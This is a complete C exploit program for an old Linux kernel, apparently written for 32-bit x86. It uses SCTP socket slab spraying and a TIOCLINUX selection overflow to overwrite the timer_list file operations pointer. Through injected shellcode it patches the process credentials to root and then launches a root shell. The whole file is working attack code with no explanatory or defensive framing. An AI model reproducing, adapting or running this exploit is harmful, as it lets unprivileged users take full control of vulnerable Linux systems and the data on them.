#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <linux/tiocl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>


#define C_OFF			10
#define PAGE_SIZE   		0x1000
#define PAGE_MASK4K 		(~(PAGE_SIZE -1))
#define PAGE_MASK8K 		(~(PAGE_SIZE*2 -1))
#define CODE_PAGE		0x10000
#define FAKE_OBJ		0x20000
#define USER_STACK_SIZE		0x1000
#define LOCALHOST		"127.0.0.1"
#define SCTP_STREAMS		27
#define TARGET_STREAM		10
#define KMALLOC			"kmalloc-128"


static __u16			srvport;
static uid_t			uid, gid;
static int			slab_fd;
static __u32			fops;
static char			cstack[USER_STACK_SIZE*2];
struct sockaddr_in		ss;
static int			dorec = 0;
static int			g_array[10];
static int			fd_zmap_srv = -1;
static struct sockaddr_in	caddr;
static int			unsafe_fd[4];
static char 			symbuf[20000];
static char			tiobuf[2048];


char				code[] =	"\x57"                     	// push   %edi
						"\x50"                     	// push   %eax
						"\x65\x8b\x3d\x00\x00\x00\x00"  // mov    %gs:0x0,%edi
						"\xb8\x41\x41\x41\x41"          // mov    0x41414141,%eax
						"\xff\xd0"                   	// call   *%eax
						"\x58"                      	// pop    %eax
						"\x5f"                      	// pop    %edi
						"\xc3";                      	// ret




static int do_mmap(base, num)
unsigned long                   base;
int                             num;
{

        void                    *addr;

        addr = mmap((void *)base, PAGE_SIZE * num, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

        if(addr == MAP_FAILED)
                return -1;

        memset(addr, 0x00, PAGE_SIZE * num);

        return 0;
}

static __u16
getport(void)
{

	__u16			pid;

	pid = (__u16)getpid();

	if(pid < 0x400)
		pid += 0x400;

	fprintf(stdout, " +++ Port = %d\n", pid);
	return pid;
}


static __u32
get_fops_addr(void)
{

	FILE			*fd;
	char			fbuf[256];


	fd = fopen("/proc/kallsyms", "r");
	if(fd < 0)
	{
		fprintf(stderr, " --- [0b Error] ");
		perror("open: kallsyms");
		exit(3);
	}

	memset(fbuf, 0x00, sizeof(fbuf));
	while(fgets(fbuf, sizeof(fbuf), fd) > 0)
	{
		char		*p = fbuf;

		fbuf[strlen(fbuf) - 1] = 0;

		if(!strcmp(p+11, "timer_list_fops"))
		{
			fbuf[9] = 0;
			fprintf(stdout, " +++ timer_list_fops = 0x%s\n", fbuf);
			return strtoul(fbuf, NULL, 16);
		}
	}

	return 0;
}

static int
is_valid_stack(tmp)
unsigned long			tmp;
{

	if(tmp > 0xc0000000 && tmp < 0xff000000)
	{
		long 		state = *((unsigned long *)tmp);

		if(state == 0)
			return 1;
		else
			return 0;
	}

	return 0;
}

static void
*get_task_struct(void)
{

	unsigned long		stack, stack4, stack8;
	int			dummy, ret;

	stack = (unsigned long)&stack;

	stack4 = stack & PAGE_MASK4K;
	stack8 = stack & PAGE_MASK8K;

	ret = *((unsigned long *)stack4);

	if(!is_valid_stack(ret))
	{
		ret = *((unsigned long *)stack8);
			if(!is_valid_stack(ret))
				return NULL;
	}

	return (void *)ret;
}

static  void
kernel_rise_priv(void)
{

	int			i;
	void			*t_struct;
	uint32_t		*tptr;

	t_struct = get_task_struct();

	if(t_struct)
	{
		tptr = t_struct;
		for(i = 0; i < 1024; i++, tptr++)
		{
			if(tptr[0] == uid && tptr[1] == uid && tptr[2] == uid && tptr[3] == uid &&
			   tptr[4] == gid && tptr[5] == gid && tptr[6] == gid && tptr[7] == gid)
			{
				tptr[0] = tptr[1] = tptr[2] = tptr[3] = 0;
				tptr[4] = tptr[5] = tptr[6] = tptr[7] = 0;

				tptr[9] = tptr[10] = tptr[11] = 0xFFFFFFFF;
				break;
			}
		}
	}
}

static void
patch_code(void)
{

	__u32			*p;

	p = (__u32 *)(code + C_OFF);
	*p = (__u32)kernel_rise_priv;

}

static void
bindcpu(void)
{

	cpu_set_t		set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);

	if(sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0)
	{
		fprintf(stderr, " --- [0b Error] ");
		perror("setaffinity");
		exit(5);
	}
}

static void
prepare(void)
{

        uid = getuid();
                fprintf(stdout, " +++ Uid = %d\n", uid);
        gid = getgid();
                fprintf(stdout, " +++ Gid = %d\n", gid);


        if(do_mmap(FAKE_OBJ, 1) < 0)
        {
                fprintf(stderr, " --- [0b Error] ");
                perror("mmap: FAKE_OBJ");
                exit(1);
        }
        fprintf(stdout, " +++ Page at 0x%x allocated\n", FAKE_OBJ);

        if(do_mmap(CODE_PAGE, 1) < 0)
        {
                fprintf(stderr, " --- [0b Error] ");
                perror("mmap: CODE_PAGE");
                exit(2);
        }
        fprintf(stdout, " +++ Page at 0x%x allocated\n", CODE_PAGE);

        fops = get_fops_addr() + 32;
        if(!fops)
        {
                        fprintf(stderr, " --- [0b Error] Unable to locate symbols!!!\n");
                        exit(4);
        }

        patch_code();
	memcpy((void *)CODE_PAGE, code, sizeof(code));

        srvport = getport();

	bindcpu();

        slab_fd = open("/proc/slabinfo", O_RDONLY);
        if(!slab_fd)
        {
                fprintf(stderr, " --- [0b Error] ");
                perror("open: slabinfo");
                exit(6);
        }

}

static void
set_sctp_sock_opt(fd, in, out)
int				fd;
__u16				in;
__u16				out;
{

	struct sctp_initmsg	msg;
	int			val = 1;
	socklen_t		len_sctp;

	len_sctp = sizeof(struct sctp_initmsg);

	getsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, &len_sctp);
	msg.sinit_num_ostreams = out;
	msg.sinit_max_instreams = in;

	setsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, len_sctp);
	setsockopt(fd, SOL_SCTP, SCTP_NODELAY, (char *)&val, sizeof(val));
}

static int
write_sctp(fd, s, channel)
int				fd;
struct sockaddr_in		*s;
int				channel;
{

	int			ret;

	ret = sctp_sendmsg(fd, "a", 1, (struct sockaddr *)s,
				       sizeof(struct sockaddr_in), 0, 0, channel, 0, 0);

	return ret;
}

static int
srv_thread(useless)
void				*useless;
{

	int			o = 1;
	int			c = 0, idx = 0;
	int			fd, ret;
	struct sockaddr_in	tmp;
	socklen_t		len;

	bindcpu();

	ss.sin_family = PF_INET;
	ss.sin_port = htons(srvport);
	ss.sin_addr.s_addr = inet_addr(LOCALHOST);

	fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if(fd < 0)
		return -1;

	set_sctp_sock_opt(fd, SCTP_STREAMS, SCTP_STREAMS);
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o));

	ret = bind(fd, (struct sockaddr *)&ss, sizeof(struct sockaddr_in));
	if(ret < 0)
		return -1;

	ret = listen(fd, 100);
	if(ret < 0)
		return -1;

	fprintf(stdout, " +++ Done\n");
	len = sizeof(struct sockaddr_in);
	while((ret = accept(fd, (struct sockaddr *)&tmp, &len)) >= 0)
	{
		if(dorec != 0 && c >= dorec && idx < 10)
		{
			g_array[idx] = ret;
			if(idx == 9)
			{
				fd_zmap_srv = ret;
				caddr = tmp;
				break;
			}

			idx++;
		}

		c++;
		write_sctp(ret, &tmp, TARGET_STREAM);
                write_sctp(ret, &tmp, TARGET_STREAM);
	}

	sleep(1);
	return 0;
}



static pid_t
start_srv(void)
{

	pid_t			pid;

	pid = clone(srv_thread, cstack + USER_STACK_SIZE - 8, CLONE_VM|CLONE_FILES|SIGCHLD, NULL);

	return pid;
}

static int 
get_total_object(fd)
int				fd;
{

	char 			name[32];
  	char 			used[32];
  	char 			total[32];
  	char 			*ptr[] = {name, used, total};
  	int 			ret, i, toread;
  	char 			*p = symbuf;

	toread = sizeof(symbuf) - 1;
  	lseek(fd, 0, SEEK_SET);

	memset(symbuf, 0x00, sizeof(symbuf));
  	while((ret = read(fd, p, toread)) > 0)
  	{
    		p += ret;
    		toread -= ret;
  	}

  	p = symbuf;
	do
  	{
    		for(i=0; i < sizeof(ptr)/sizeof(void *); i++)
    		{
      			char *d = ptr[i];
      			while(*p != ' ')
        		*d++ = *p++;
      			*d = 0;
      			while(*p == ' ')
        			p++;
    		}

    		while(*p++ != '\n');

    		if(!strcmp(KMALLOC, name))
      			return atoi(total);

  	} while(*p != 0);

	return 0;
}

static int
create_and_init(void)
{

	int			fd;

	fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if(fd < 0)
	{
		fprintf(stderr, " --- [0b Error] ");
		perror("socket: sctp");
		exit(7);
	}

	set_sctp_sock_opt(fd, SCTP_STREAMS, SCTP_STREAMS);
	return fd;
}

static void
connect_peer(fd, s)
int				fd;
struct sockaddr_in		*s;
{

	int			ret;

	ret = connect(fd, (struct sockaddr *)s, sizeof(struct sockaddr_in));
	if(ret < 0)
	{
		fprintf(stderr, " --- [0b Error] ");
		perror("connect: sctp peer");
		exit(8);
	}
}

static void
conn_and_write(fd, s, channel)
int				fd;
struct sockaddr_in		*s;
__u16				channel;
{

	connect_peer(fd, s);
	write_sctp(fd, s, channel);
        write_sctp(fd, s, channel);
}

static void
do_socks(s, channel)
struct sockaddr_in		*s;
__u16				channel;
{

	int			i, fd;
	int			n_objs, tmp_n_objs;
	int			next = 8;

	n_objs = get_total_object(slab_fd);
	fprintf(stdout, " +++ Total available objects: %d\n", n_objs);

	for(i = 0; next != 0; i++)
	{
		fd = create_and_init();

		tmp_n_objs = get_total_object(slab_fd);
		if(!dorec && tmp_n_objs != n_objs)
			dorec = i;

		conn_and_write(fd, s, channel);
		if(dorec)
			next--;
	}
}

static void
clr(fd)
int				fd;
{

	write(fd, "\33[H\33[J", 6);
}

static void
alloc_tioclinux(void)
{

	int			i;
	char			out[128*3];
	char			utf8[3] = {0xE2, 0x94, 0xBB};
	struct tiocl_selection	*sel;
	char			*t;
	void			*v;

	v = malloc(sizeof(struct tiocl_selection) + 1);
	t = (char *)v;

	sel = (struct tiocl_selection *)(t + 1);
	memset(out, 0x41, sizeof(out));

	for(i = 0; i < 128; i++)
	{
		tiobuf[(i * 3)] = utf8[0];
		tiobuf[(i * 3) + 1] = utf8[1];
		tiobuf[(i * 3) + 2] = utf8[2];
	}

	*t = TIOCL_SETSEL;
	sel->xs = 1;
	sel->ys = 14;
	sel->xe = 43;
	sel->ye = 14;

	write(1, tiobuf, sizeof(tiobuf));
	if(ioctl(1, TIOCLINUX, v) < 0)
	{
		fprintf(stderr, " --- [0b Error] stdout is not on a virtual console\n");
		exit(8);
	}
}

static void
migrate_fds(void)
{

	pid_t			child;

	child = fork();

	if(!child)
	{
		setsid();

		while(1);
			sleep(1);

	}
}


static void
trigger_fault(void)
{

	char			*argv[] = {"/bin/sh", NULL};
	int			i, fd;


	fd = open("/proc/timer_list", O_RDONLY);
	if(fd >= 0)
	{
		ioctl(fd, 0, 0);

  		for(i = 3; i < 2048; i++)
  		{
    			if((unsafe_fd[0] == i || unsafe_fd[1] == i ||
       				unsafe_fd[2] == i || unsafe_fd[3] == i))
        				continue;

    			close(i);
  		}
		migrate_fds();

		for(i = 0; i < 4; i++)
			close(unsafe_fd[i]);


		if(!getuid())
		{
			fprintf(stdout, " +++ 0bc ownage... w000t w000t\n");
			execve("/bin/sh", argv, NULL);
		}
		else
			fprintf(stderr, " --- [0b Error] Something went wrong?!\n");
	}
	else
	{
		fprintf(stderr, " --- [0b Error] Cannot open timer_list\n");
		exit(10);
	}
}

static void
overwrite_fops(from, to)
int				from;
struct sockaddr_in		*to;
{

	char			*p;
	__u32			*uip;


	p = (void *)FAKE_OBJ;
	uip = (__u32 *)p;
	*uip = fops;

	write_sctp(from, to, 1);
	sleep(1);

	trigger_fault();
}

int
main(argc, argv)
int				argc;
char				**argv;
{

	int			i;
	int			peerx, peery;

	clr(1);
	fprintf(stdout, "[0b] Prepare for battle...\n");
	prepare();

	fprintf(stdout, "[0b] Starting sctp server...\n");
	start_srv();
	sleep(3);

	fprintf(stdout, "[0b] Exhausting the slab...\n");
	do_socks(&ss, TARGET_STREAM);

	fprintf(stdout, " +++ Done\n");
	for(i = 0; i < 7; i++)
		close(g_array[8 - 1 - i]);

	fprintf(stdout, "[0b] Triggering the vulnerability...\n");
	alloc_tioclinux();

	peerx = create_and_init();
	connect_peer(peerx, &ss);
	peery = create_and_init();
	connect_peer(peery, &ss);

	unsafe_fd[0] = peerx;
	unsafe_fd[1] = g_array[8];
	unsafe_fd[2] = peery;
	unsafe_fd[3] = g_array[9];

	fprintf(stdout, "\n[0b] Getting root...\n");
	overwrite_fops(fd_zmap_srv, &caddr);

	return 0;

}
